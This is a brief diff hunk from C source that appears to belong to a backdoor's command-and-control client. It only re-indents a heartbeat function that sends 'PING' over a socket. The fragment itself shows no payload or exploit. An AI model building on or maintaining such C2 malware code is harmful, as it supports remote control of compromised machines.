@@ -60,8 +60,8 @@ void c2_heartbeat(char *cmd_id, int sock) {
     #ifdef DEBUG
     printf("[+] Rota C2 heartbeat!\n");
     #endif
-       char *buffer = "PING";
-       build_c2_response(buffer, cmd_id, sock);
+    char *buffer = "PING";
+    build_c2_response(buffer, cmd_id, sock);
 }
 
 void c2_set_timeout(int *sleepTime, int newTime) {
